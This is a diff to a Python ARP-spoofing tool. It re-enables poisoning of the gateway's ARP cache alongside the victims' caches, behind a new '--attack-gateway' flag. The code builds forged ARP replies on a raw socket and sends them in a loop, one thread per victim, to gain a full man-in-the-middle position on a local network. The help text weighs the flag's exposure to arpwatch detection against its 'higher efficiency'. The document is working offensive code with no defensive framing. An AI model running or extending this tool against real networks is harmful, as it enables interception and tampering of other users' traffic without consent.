@@ -19,6 +19,7 @@ interfaces = netifaces.interfaces()  # All device interfaces
 interface = None  # Attacker interface
 gateway_ip = None  # Gateway IP-address
 mac = None  # Attacker MAC-address
+hard = False  # Attack gateway, vulnerable to arpwatch
 
 victims = []  # List of victims in local network
 threads = []  # List of active threads
@@ -27,12 +28,13 @@ s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
 
 
 class attackThread(threading.Thread):
-	def __init__(self, gateway, victim, mac, connect):
+	def __init__(self, gateway, victim, mac, connect, hard):
 		threading.Thread.__init__(self)
 		self.victim = victim
 		self.gateway = gateway
 		self.mac = self.encode_mac(mac)
 		self.connect = connect
+		self.hard = hard
 
 		# Other
 		self.arp = b'\x08\x06'  # Code ARP protocol
@@ -40,22 +42,25 @@ class attackThread(threading.Thread):
 
 	def run(self):
 		victim_mac = self.get_mac(self.victim)
-		#gateway_mac = self.get_mac(self.gateway)
+		gateway_mac = self.get_mac(self.gateway)
 
 		epacket1 = victim_mac + self.mac + self.arp
-		#epacket2 = gateway_mac + self.mac + self.arp
+		epacket2 = gateway_mac + self.mac + self.arp
 
 		gip = socket.inet_aton(self.gateway)
 		vip = socket.inet_aton(self.victim)
 
 		victim_arp = epacket1 + self.protocol + self.mac + gip + victim_mac + vip
-		#gateway_arp = epacket2 + self.protocol + self.mac + vip + gateway_mac + gip
+		gateway_arp = epacket2 + self.protocol + self.mac + vip + gateway_mac + gip
 
 		while True:
 			self.connect.send(victim_arp)
 			print("packet send to " + self.victim)
-			#self.connect.send(gateway_arp)
-			time.sleep(1)
+
+			if self.hard:
+				self.connect.send(gateway_arp)
+
+			time.sleep(1.5)
 
 
 	def get_mac(self, local_ip):
@@ -76,21 +81,22 @@ class attackThread(threading.Thread):
 
 
 def attack(ips):
-	global threads, mac, gateway_ip
+	global threads, mac, gateway_ip, hard
 
 	for ip in ips:
-		threads.append(attackThread(gateway_ip, ip, mac, s))
+		threads.append(attackThread(gateway_ip, ip, mac, s, hard))
 
 	for th in threads:
 		th.start()
 
 
 def main():
-	global interface, mac, s, victims, gateway_ip
+	global interface, hard, mac, s, victims, gateway_ip
 	args = arguments()
 
 	interface = args.interface
 	gateway_ip = args.gateway
+	hard = args.attackgateway
 
 	if interface == None or gateway_ip == None:
 		raise KeyboardInterrupt
@@ -137,6 +143,7 @@ def arguments():
 	parser.add_argument('-i', '--interface', dest="interface", help="Set a interface")
 	parser.add_argument('-g', '--gateway', dest="gateway", help="Set a gateway")
 	parser.add_argument('-t', '--target', dest="target", help="Set a file with local IPs")
+	parser.add_argument('-a', '--attack-gateway', action="store_true", dest="attackgateway", help="Attack on the gateway, more vulnerable to arpwatch. Higher efficiency.")
 
 	return parser.parse_args()
 
